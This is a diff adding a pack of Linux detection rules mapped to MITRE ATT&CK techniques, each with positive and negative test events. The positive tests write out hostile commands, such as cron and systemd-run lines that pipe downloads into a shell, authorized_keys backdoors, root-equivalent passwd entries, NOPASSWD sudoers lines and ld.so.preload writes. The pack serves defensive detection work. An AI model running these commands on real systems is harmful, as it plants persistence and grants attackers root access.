@@ -1,0 +1,6549 @@
+{
+ "pack": "unix2",
+ "rules": [
+  {
+   "id": "ux2-systemd-enable-tmp-unit",
+   "name": "systemctl enabling a unit file from a world-writable directory",
+   "description": "systemctl enable or link pointing at a unit file under /tmp, /var/tmp or /dev/shm, a staging location used to install a service without touching the package manager.",
+   "tactic": "Persistence",
+   "technique": "T1543.002",
+   "technique_name": "Create or Modify System Process: Systemd Service",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/systemctl"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(enable|link)\\b.*\\s/(tmp|var/tmp|dev/shm)/[^\\s]*\\.(service|timer)"
+     }
+    ]
+   },
+   "tags": [
+    "systemd",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/systemctl",
+      "command": "systemctl enable /var/tmp/.cache-sync.service"
+     },
+     {
+      "executable": "/usr/bin/systemctl",
+      "command": "systemctl link /dev/shm/updater.timer"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/systemctl",
+      "command": "systemctl enable --now nginx.service"
+     },
+     {
+      "executable": "/usr/bin/systemctl",
+      "command": "systemctl status /tmp/x.service"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-systemd-user-unit-file",
+   "name": "User-level systemd unit or timer created",
+   "description": "A .service or .timer file appears in a per-user systemd directory, which runs at login without root and is rarely created by hand outside developer workstations.",
+   "tactic": "Persistence",
+   "technique": "T1543.002",
+   "technique_name": "Create or Modify System Process: Systemd Service",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "field": "path",
+    "op": "regex",
+    "pattern": "/\\.config/systemd/user/[^/]+\\.(service|timer)$"
+   },
+   "tags": [
+    "systemd",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/home/ann/.config/systemd/user/dbus-helper.service",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/home/ann/.config/systemd/user/default.target.wants",
+      "operation": "create"
+     },
+     {
+      "path": "/home/ann/.config/autostart-notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-systemd-unit-execstart-tmp",
+   "name": "Unit file written with ExecStart in a temp path",
+   "description": "A systemd unit is written by shell redirection or tee whose ExecStart points at /tmp, /var/tmp or /dev/shm.",
+   "tactic": "Persistence",
+   "technique": "T1543.002",
+   "technique_name": "Create or Modify System Process: Systemd Service",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "ExecStart\\s*=\\s*/(tmp|var/tmp|dev/shm)/"
+   },
+   "tags": [
+    "systemd",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c printf '[Service]\\nExecStart=/dev/shm/.m\\n' > /etc/systemd/system/m.service"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c printf '[Service]\\nExecStart=/usr/bin/node /srv/app.js\\n' > /etc/systemd/system/app.service"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-systemd-run-download-pipe",
+   "name": "Transient systemd unit running a download pipeline",
+   "description": "systemd-run creating a transient unit whose command downloads and pipes into a shell.",
+   "tactic": "Persistence",
+   "technique": "T1053.006",
+   "technique_name": "Scheduled Task/Job: Systemd Timers",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/systemd-run"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(curl|wget)\\b.*\\|\\s*(ba|da)?sh"
+     }
+    ]
+   },
+   "tags": [
+    "systemd",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/systemd-run",
+      "command": "systemd-run --user --on-boot=60 /bin/sh -c 'curl -s http://203.0.113.4/x | sh'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/systemd-run",
+      "command": "systemd-run --scope -p MemoryMax=1G make -j4"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-cron-download-pipe-crontab",
+   "name": "Crontab installed from a pipe containing a download",
+   "description": "A shell pipeline echoes a cron schedule that downloads or runs a remote script into crontab, the one-line persistence idiom.",
+   "tactic": "Persistence",
+   "technique": "T1053.003",
+   "technique_name": "Scheduled Task/Job: Cron",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(echo|printf)\\b.*[*0-9/,]+\\s+[*0-9/,]+\\s+[*0-9/,]+\\s+[*0-9/,]+\\s+[*0-9/,]+\\s+.*(curl|wget|/dev/tcp|nc )"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\|\\s*crontab\\s+-"
+     }
+    ]
+   },
+   "tags": [
+    "cron",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c (crontab -l; echo '*/5 * * * * curl -s http://203.0.113.9/a.sh | sh') | crontab -"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "sh -c echo '* * * * * wget -q -O- http://198.51.100.2/p|sh' | crontab -"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c (crontab -l; echo '0 3 * * * /usr/local/bin/backup.sh') | crontab -"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-cron-hidden-file",
+   "name": "Hidden file created in a cron directory",
+   "description": "A dot-prefixed file under /etc/cron.d or the cron.hourly/daily/weekly directories; run-parts skips dotfiles but cron.d does not, and hidden names hide a job from listings.",
+   "tactic": "Persistence",
+   "technique": "T1053.003",
+   "technique_name": "Scheduled Task/Job: Cron",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "field": "path",
+    "op": "regex",
+    "pattern": "^/etc/cron\\.(d|hourly|daily|weekly|monthly)/\\.[^/]+$"
+   },
+   "tags": [
+    "cron",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/etc/cron.d/.sysupd",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/etc/cron.d/logrotate",
+      "operation": "create"
+     },
+     {
+      "path": "/etc/cron.daily/apt-compat",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-cron-spool-shell-write",
+   "name": "Cron spool edited directly with a shell",
+   "description": "A shell writes straight into /var/spool/cron or /etc/crontab instead of going through crontab -e.",
+   "tactic": "Persistence",
+   "technique": "T1053.003",
+   "technique_name": "Scheduled Task/Job: Cron",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(>>?|tee( -a)?)\\s*/(var/spool/cron(/crontabs)?/\\w+|etc/crontab)\\b"
+   },
+   "tags": [
+    "cron",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo '* * * * * /tmp/.x' >> /var/spool/cron/crontabs/root"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "sh -c echo '@reboot /dev/shm/a' | tee -a /etc/crontab"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/crontab",
+      "command": "crontab -l"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c cat /etc/crontab"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-ldso-preload-write",
+   "name": "Shared object registered in /etc/ld.so.preload",
+   "description": "A command writes to /etc/ld.so.preload, loading a library into every dynamically linked process, the userland rootkit mechanism.",
+   "tactic": "Persistence",
+   "technique": "T1574.006",
+   "technique_name": "Hijack Execution Flow: Dynamic Linker Hijacking",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(>>?|tee( -a)?|sed -i.*)\\s*/etc/ld\\.so\\.preload"
+   },
+   "tags": [
+    "ld-preload",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo /usr/lib/libsys.so > /etc/ld.so.preload"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "sh -c echo /tmp/.k.so | tee -a /etc/ld.so.preload"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "cat /etc/ld.so.preload"
+     },
+     {
+      "executable": "/usr/sbin/ldconfig",
+      "command": "ldconfig -v"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-ldso-conf-d-tmp",
+   "name": "ld.so.conf.d entry pointing at a temp directory",
+   "description": "Adding /tmp, /dev/shm or /var/tmp to the dynamic linker search path lets a planted library shadow a system one.",
+   "tactic": "Persistence",
+   "technique": "T1574.006",
+   "technique_name": "Hijack Execution Flow: Dynamic Linker Hijacking",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(echo|printf)\\s+['\\\"]?/(tmp|dev/shm|var/tmp)\\S*\\s*['\\\"]?\\s*>>?\\s*/etc/ld\\.so\\.conf(\\.d/\\S+)?"
+   },
+   "tags": [
+    "ld-preload",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo /dev/shm/lib > /etc/ld.so.conf.d/x.conf"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo /opt/app/lib > /etc/ld.so.conf.d/app.conf"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-rclocal-shell-write",
+   "name": "Command appended to rc.local",
+   "description": "A shell appends a command to /etc/rc.local or rc.common, executed as root at boot.",
+   "tactic": "Persistence",
+   "technique": "T1037.004",
+   "technique_name": "Boot or Logon Initialization Scripts: RC Scripts",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(>>?|tee( -a)?)\\s*/etc/(rc\\.local|rc\\.common)\\b|\\bsed\\s+(-\\w+\\s+)*-i\\S*\\s.*/etc/rc\\.(local|common)\\b"
+   },
+   "tags": [
+    "rc",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo '/tmp/.bd &' >> /etc/rc.local"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "cat /etc/rc.local"
+     },
+     {
+      "executable": "/usr/bin/chmod",
+      "command": "chmod +x /etc/rc.local"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-rclocal-file",
+   "name": "rc.local modified",
+   "description": "File event on /etc/rc.local, a legacy boot hook that is empty on most modern systems.",
+   "tactic": "Persistence",
+   "technique": "T1037.004",
+   "technique_name": "Boot or Logon Initialization Scripts: RC Scripts",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "field": "path",
+    "op": "equals",
+    "pattern": "/etc/rc.local"
+   },
+   "tags": [
+    "rc",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/etc/rc.local",
+      "operation": "modify"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/etc/rc.d/init.d/functions",
+      "operation": "modify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-pam-module-planted",
+   "name": "PAM module created in a security directory",
+   "description": "A new or modified pam_*.so appears in a security directory; a trojaned module can capture credentials or accept a magic password.",
+   "tactic": "Persistence",
+   "technique": "T1556.003",
+   "technique_name": "Modify Authentication Process: Pluggable Authentication Modules",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "field": "path",
+    "op": "regex",
+    "pattern": "/security/pam_[a-z0-9_]+\\.so$"
+   },
+   "tags": [
+    "pam",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/lib/x86_64-linux-gnu/security/pam_unix2.so",
+      "operation": "create"
+     },
+     {
+      "path": "/usr/lib64/security/pam_sshauth.so",
+      "operation": "modify"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/lib/x86_64-linux-gnu/security/pam_unix.so.dpkg-new",
+      "operation": "create"
+     },
+     {
+      "path": "/usr/lib/python3/security/readme.so.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-pam-config-exec-permit",
+   "name": "PAM configuration edited to exec a program or always permit",
+   "description": "A shell edits /etc/pam.d adding pam_exec, or pam_permit as sufficient for auth.",
+   "tactic": "Persistence",
+   "technique": "T1556.003",
+   "technique_name": "Modify Authentication Process: Pluggable Authentication Modules",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/etc/pam\\.d/"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "pam_exec\\.so|auth\\s+sufficient\\s+pam_permit\\.so"
+     }
+    ]
+   },
+   "tags": [
+    "pam",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo 'auth optional pam_exec.so quiet expose_authtok /tmp/.l' >> /etc/pam.d/sshd"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "sed -i '1i auth sufficient pam_permit.so' /etc/pam.d/su"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "grep pam_unix /etc/pam.d/sshd"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "cat /etc/pam.d/common-auth"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-ssh-authkeys-append",
+   "name": "SSH public key appended to authorized_keys by shell",
+   "description": "A shell redirect appends a public key to authorized_keys, the common backdoor-access step; ssh-copy-id and configuration management use other paths.",
+   "tactic": "Persistence",
+   "technique": "T1098.004",
+   "technique_name": "Account Manipulation: SSH Authorized Keys",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(echo|printf|cat)\\b.*(ssh-rsa|ssh-ed25519|ecdsa-sha2)\\b.*>>?\\s*\\S*authorized_keys2?\\b"
+   },
+   "tags": [
+    "ssh",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB attacker@kali' >> /root/.ssh/authorized_keys"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "sh -c echo ssh-ed25519 AAAAC3Nza x > /home/www/.ssh/authorized_keys"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/chmod",
+      "command": "chmod 600 /home/ann/.ssh/authorized_keys"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "cat /home/ann/.ssh/authorized_keys"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-ssh-authkeys-download",
+   "name": "authorized_keys populated from a download",
+   "description": "curl or wget writes remote content into an authorized_keys file.",
+   "tactic": "Persistence",
+   "technique": "T1098.004",
+   "technique_name": "Account Manipulation: SSH Authorized Keys",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(curl|wget)\\b.*(-o|-O|>>?)\\s*\\S*\\.ssh/authorized_keys2?\\b|(curl|wget)\\b.*\\|\\s*tee( -a)?\\s+\\S*authorized_keys"
+   },
+   "tags": [
+    "ssh",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s http://203.0.113.5/k.pub -o /root/.ssh/authorized_keys"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c wget -qO- http://198.51.100.7/k | tee -a /home/u/.ssh/authorized_keys"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -fsSL https://github.com/ann.keys -o /tmp/ann.keys"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-sshd-config-backdoor-options",
+   "name": "sshd_config edited for root login or alternate key command",
+   "description": "A shell edits sshd_config enabling PermitRootLogin, empty passwords, or an AuthorizedKeysCommand in a temp path.",
+   "tactic": "Persistence",
+   "technique": "T1098",
+   "technique_name": "Account Manipulation",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "sshd_config"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(echo|printf|sed -i|tee)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "PermitRootLogin\\s+(yes|without-password)|PermitEmptyPasswords\\s+yes|AuthorizedKeysCommand\\s+/(tmp|dev/shm|var/tmp)"
+     }
+    ]
+   },
+   "tags": [
+    "ssh",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"
+     },
+     {
+      "executable": "/usr/bin/sed",
+      "command": "sed -i s/PermitEmptyPasswords no/PermitEmptyPasswords yes/ /etc/ssh/sshd_config"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/sed",
+      "command": "sed -i s/#Port 22/Port 2222/ /etc/ssh/sshd_config"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "grep PermitRootLogin /etc/ssh/sshd_config"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-udev-rule-run-exec",
+   "name": "udev rule with RUN+= command written",
+   "description": "A udev rule written with RUN+= or PROGRAM= executes a command on device events and survives reboot.",
+   "tactic": "Persistence",
+   "technique": "T1546.017",
+   "technique_name": "Event Triggered Execution: Udev Rules",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/(etc|lib|usr/lib)/udev/rules\\.d/"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "RUN\\+?="
+     }
+    ]
+   },
+   "tags": [
+    "udev",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo 'ACTION==\"add\", SUBSYSTEM==\"usb\", RUN+=\"/tmp/.u.sh\"' > /etc/udev/rules.d/99-x.rules"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "cat /etc/udev/rules.d/70-persistent-net.rules"
+     },
+     {
+      "executable": "/usr/bin/udevadm",
+      "command": "udevadm control --reload-rules"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-udev-rules-file-create",
+   "name": "udev rules file created in /etc",
+   "description": "A new file in /etc/udev/rules.d; usually from packages, so informational.",
+   "tactic": "Persistence",
+   "technique": "T1546.017",
+   "technique_name": "Event Triggered Execution: Udev Rules",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "field": "path",
+    "op": "regex",
+    "pattern": "^/etc/udev/rules\\.d/[^/]+\\.rules$"
+   },
+   "tags": [
+    "udev",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/etc/udev/rules.d/99-usbpersist.rules",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/etc/udev/hwdb.d/60-keyboard.hwdb",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-xdg-autostart-desktop",
+   "name": "XDG autostart entry created",
+   "description": "A .desktop file in an autostart directory runs at graphical login.",
+   "tactic": "Persistence",
+   "technique": "T1547.013",
+   "technique_name": "Boot or Logon Autostart Execution: XDG Autostart Entries",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "field": "path",
+    "op": "regex",
+    "pattern": "/(\\.config/autostart|etc/xdg/autostart)/[^/]+\\.desktop$"
+   },
+   "tags": [
+    "xdg",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/home/ann/.config/autostart/update-notifier.desktop",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/home/ann/.config/autostart/README",
+      "operation": "create"
+     },
+     {
+      "path": "/usr/share/applications/firefox.desktop",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-insmod-tmp-module",
+   "name": "Kernel module loaded from a temporary or home path",
+   "description": "insmod or modprobe of a .ko staged in /tmp, /dev/shm or a home directory, typical of rootkit loading.",
+   "tactic": "Persistence",
+   "technique": "T1547.006",
+   "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "/insmod",
+       "/modprobe"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s/(tmp|var/tmp|dev/shm|home/[^/]+|root)/[^\\s]*\\.ko(\\s|$)"
+     }
+    ]
+   },
+   "tags": [
+    "kernel-module",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/sbin/insmod",
+      "command": "insmod /tmp/diamorphine.ko"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/sbin/modprobe",
+      "command": "modprobe overlay"
+     },
+     {
+      "executable": "/sbin/insmod",
+      "command": "insmod /lib/modules/6.1.0/kernel/fs/xfs.ko"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-profiled-script-write",
+   "name": "Shell script written into /etc/profile.d",
+   "description": "A script in /etc/profile.d runs for every login shell; a durable foothold when dropped by hand.",
+   "tactic": "Persistence",
+   "technique": "T1546.004",
+   "technique_name": "Event Triggered Execution: Unix Shell Configuration Modification",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "field": "path",
+    "op": "regex",
+    "pattern": "^/etc/profile\\.d/[^/]+\\.sh$"
+   },
+   "tags": [
+    "shell-profile",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/etc/profile.d/zz-update.sh",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/etc/profile.d/README",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-useradd-uid0",
+   "name": "Account created with UID 0",
+   "description": "useradd/usermod -o -u 0 creates a second root-equivalent account.",
+   "tactic": "Persistence",
+   "technique": "T1136.001",
+   "technique_name": "Create Account: Local Account",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "/useradd",
+       "/usermod",
+       "/adduser"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-o\\b.*-u\\s*0\\b|-u\\s*0\\b.*-o\\b|--non-unique.*--uid\\s+0\\b"
+     }
+    ]
+   },
+   "tags": [
+    "account",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/useradd",
+      "command": "useradd -o -u 0 -g 0 -M -d /root backup"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/useradd",
+      "command": "useradd -m -u 1500 -s /bin/bash svc-ci"
+     },
+     {
+      "executable": "/usr/sbin/usermod",
+      "command": "usermod -aG docker ann"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-passwd-file-uid0-append",
+   "name": "Account line appended to /etc/passwd by shell",
+   "description": "A shell appends an account directly to /etc/passwd instead of using useradd.",
+   "tactic": "Persistence",
+   "technique": "T1136.001",
+   "technique_name": "Create Account: Local Account",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": ">>\\s*/etc/passwd\\b|tee\\s+(-a\\s+)?/etc/passwd\\b"
+   },
+   "tags": [
+    "account",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo 'toor:x:0:0::/root:/bin/bash' >> /etc/passwd"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "sh -c echo 'hax::0:0:::/bin/sh' | tee -a /etc/passwd"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "grep ann /etc/passwd"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "cat /etc/passwd"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-sudoers-nopasswd-append",
+   "name": "NOPASSWD sudo rule written by shell",
+   "description": "A shell writes an ALL=(ALL) NOPASSWD: ALL line to sudoers or a drop-in.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1548.003",
+   "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "NOPASSWD:\\s*ALL"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(>>?|tee( -a)?|sed -i)\\s*\\S*(/etc/sudoers|sudoers\\.d/)"
+     }
+    ]
+   },
+   "tags": [
+    "sudo",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo 'www ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "sh -c echo 'ann ALL=(ALL) NOPASSWD: ALL' | tee /etc/sudoers.d/90-ann"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/visudo",
+      "command": "visudo -c"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "cat /etc/sudoers.d/90-cloud-init-users"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-setcap-setuid",
+   "name": "Capability granting setuid applied to a binary",
+   "description": "setcap cap_setuid or cap_sys_admin on an interpreter or user-writable file.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1548.001",
+   "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/setcap"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "cap_(setuid|setgid|sys_admin|dac_override|sys_ptrace)"
+     }
+    ]
+   },
+   "tags": [
+    "capabilities",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/setcap",
+      "command": "setcap cap_setuid+ep /usr/bin/python3.10"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/setcap",
+      "command": "setcap cap_net_bind_service=+ep /usr/local/bin/myserver"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-suid-bit-tmp-binary",
+   "name": "SUID bit set on a binary in a temporary path",
+   "description": "chmod u+s or 4755 on a file in /tmp, /var/tmp or /dev/shm.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1548.001",
+   "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/chmod"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\+s|u\\+s|[2467][0-7]{3})\\s+/(tmp|var/tmp|dev/shm)/"
+     }
+    ]
+   },
+   "tags": [
+    "suid",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/chmod",
+      "command": "chmod 4755 /tmp/.sh"
+     },
+     {
+      "executable": "/usr/bin/chmod",
+      "command": "chmod u+s /dev/shm/rootbash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/chmod",
+      "command": "chmod 755 /tmp/build.sh"
+     },
+     {
+      "executable": "/usr/bin/chmod",
+      "command": "chmod u+s /usr/bin/newuidmap"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-shadow-read-tools",
+   "name": "Password hash file copied or encoded",
+   "description": "cat piped, cp, base64, xxd, tar, scp or similar applied to /etc/shadow or /etc/gshadow, or unshadow merging it.",
+   "tactic": "Credential Access",
+   "technique": "T1003.008",
+   "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(python[0-9.]*|perl|ruby|php)\\b.*\\s-[ceE]\\s.*/etc/g?shadow\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
